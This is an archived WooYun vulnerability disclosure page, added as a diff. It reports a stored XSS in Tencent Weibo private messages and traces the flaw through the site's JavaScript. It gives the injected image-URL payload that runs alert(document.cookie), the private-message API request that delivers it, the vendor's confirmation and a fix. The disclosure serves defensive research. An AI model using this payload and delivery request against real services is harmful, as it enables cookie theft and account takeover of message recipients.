@@ -1,0 +1,302 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		PKAV腾讯专场 - 1. 腾讯微博私信存储型XSS  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		PKAV腾讯专场 - 1. 腾讯微博私信存储型XSS  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-10-18 19:01</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-10-18：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-10-19：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-10-29：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-11-08：	细节向普通白帽子公开<br/>
+									2012-11-18：	细节向实习白帽子公开<br/>
+									2012-12-02：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">最近大家都流行连载了。那么我们也开场吧~  最近心伤的胖子一直在连载，不知道发重复了没。 此漏洞成因会同步更新至：pkav.net</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">漏洞成因：<br />
+<br />
+<br />
+<br />
+缺陷文件：<br />
+<br />
+<br />
+<br />
+http://mat1.gtimg.com/www/mb/js/mi_121016.js<br />
+<br />
+<br />
+<br />
+1.首先进入 MI.TalkList.picEvent 函数<br />
+<br />
+<br />
+<br />
+</p><pre><code>MI.TalkList.picEvent = function(a) {<br />
+  ....</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+其中a为页面中所有class为PicBox的div集合，即 div .PicBox<br />
+<br />
+<br />
+<br />
+2. 循环每一个 class为PicBox的div<br />
+<br />
+<br />
+<br />
+</p><pre><code>for (var b = 0, f = a.length; b &lt; f; b++) {<br />
+            var g = a[b],<br />
+....</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+g为每个div<br />
+<br />
+<br />
+<br />
+3. k = c(g, &quot;img&quot;)[0], 获取PicBox里的第一个img图片<br />
+<br />
+<br />
+<br />
+4. h = k.parentNode, 获取k的父级元素，是一个链接&lt;a href=&quot;....&quot;<br />
+<br />
+<br />
+<br />
+5. j = c(g, &quot;.picTools&quot;), 获取PicBox这个div里的 picTools DIV<br />
+<br />
+<br />
+<br />
+6. 缺陷在下面这几句JS代码<br />
+<br />
+<br />
+<br />
+</p><pre><code>if(!MI.user.fun.wideStyle) <br />
+	MI.tmpl.picTool = [&#039;&lt;div class=&quot;tools bor_bg picTools&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;btnBack&quot;&gt;&lt;em&gt;&lt;/em&gt;&#039;, _(&quot;向左转&quot;), &#039;&lt;/a&gt;&lt;span&gt;|&lt;/span&gt;&lt;a href=&quot;#&quot; class=&quot;btnPrev&quot;&gt;&lt;em&gt;&lt;/em&gt;&#039;, _(&quot;向右转&quot;), &#039;&lt;/a&gt;&lt;a href=&quot;$Url/2000&quot; class=&quot;btnOriginal&quot; onclick=&quot;MI.Bos(\&#039;btnPicSource\&#039;)&quot; target=&quot;_blank&quot;&gt;&#039;, _(&quot;查看原图&quot;), &quot;&lt;/a&gt;&lt;/div&gt;&quot;].join(&quot;&quot;);<br />
+<br />
+UI.before(UI.html(MI.tmpl.picTool.replace(&quot;$Url&quot;, h.href.replace(/\/460$/g, &quot;&quot;)).replace(&quot;$hisUrl&quot;, l))[0], h);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+MI.tmpl.picTool直接将$Url替换为 h.href <br />
+<br />
+<br />
+<br />
+而h在取href属性值时，会自动将 &amp;quot;&amp;lt;&amp;gt;等转换回 &quot;, &lt; ,&gt; 等符号。<br />
+<br />
+<br />
+<br />
+----------------------------------<br />
+<br />
+<br />
+<br />
+结合实际HTML结构，如下：<br />
+<br />
+<br />
+<br />
+k 对应用户发送的图片<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;img class=&quot;&quot; crs=&quot;http://t2.qpic.cn/mblogpic/4955e75656b3d175296c/460#&amp;quot;&amp;gt;&amp;lt;img src=1 onerror=&amp;quot;alert(document.cookie);&amp;quot; style=&amp;quot;display:none&amp;quot;&amp;gt;&amp;lt;i a=&amp;quot;/160&quot; src=&quot;http://t2.qpic.cn/mblogpic/4955e75656b3d175296c/460#&amp;quot;&amp;gt;&amp;lt;img src=1 onerror=&amp;quot;alert(document.cookie);&amp;quot; style=&amp;quot;display:none&amp;quot;&amp;gt;&amp;lt;i a=&amp;quot;/160&quot; style=&quot;display: inline; &quot; alt=&quot;[图片]&quot;&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+h 对应k外层的 A 标签<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;a class=&quot;pic &quot; href=&quot;http://t2.qpic.cn/mblogpic/4955e75656b3d175296c/460#&amp;quot;&amp;gt;&amp;lt;img src=1 onerror=&amp;quot;alert(document.cookie);&amp;quot; style=&amp;quot;display:none&amp;quot;&amp;gt;&amp;lt;i a=&amp;quot;/460&quot; hidefocus=&quot;true&quot;&gt; ... &lt;/a&gt;</code></pre><p class='detail'><br />
+<br />
+h.href中的&amp;quot; &amp;lt;, &amp;gt 等重新转义回了 &quot; , &lt; ,&gt;<br />
+<br />
+<br />
+<br />
+最终导致UI.html(MI.tmpl.picTool.replace(&quot;$Url&quot;, h.href.replace(/\/460$/g, &quot;&quot;)).replace(&quot;$hisUrl&quot;, l))[0], h)<br />
+<br />
+<br />
+<br />
+在输出HTML时，导致XSS出现<br />
+<br />
+<br />
+<br />
+--------------------------------<br />
+<br />
+<br />
+<br />
+利用方法，发送私信时，<br />
+<br />
+<br />
+<br />
+http://api.t.qq.com/inbox/pm_mgr.php <br />
+<br />
+<br />
+<br />
+</p><pre><code>source	reply<br />
+ptid	gainover<br />
+roomid<br />
+content	.................<br />
+fid	<br />
+arturl  http://t2.qpic.cn/mblogpic/4955e75656b3d175296c/460#&quot;&gt;&lt;img src=1 onerror=&quot;alert(document.cookie);&quot; style=&quot;display:none&quot;&gt;&lt;i a=&quot;<br />
+murl<br />
+target	gainover<br />
+func	send<br />
+ef	js<br />
+pmlang	zh_CN<br />
+apiType	8<br />
+apiHost	http://api.t.qq.com</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">对方打开私信时会触发XSS。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/181842221dc33e6dbc1793d04ac54accdee45f2a.jpg" target="_blank"><img src="../images/181842221dc33e6dbc1793d04ac54accdee45f2a.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/18184425762d40cd633b77da4a7a0db789655131.jpg" target="_blank"><img src="../images/18184425762d40cd633b77da4a7a0db789655131.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/25132500c359688e118ae4b30f1a3ad0b41e052d.jpg" target="_blank"><img src="../images/25132500c359688e118ae4b30f1a3ad0b41e052d.jpg" alt="4(1).jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">MI.TalkList.picEvent中 h.href.replace之前先将h.href转义一次～ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-013528" title="PKAV腾讯专场 - 1. 腾讯微博私信存储型XSS">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2012-10-19 11:16</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="13528";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
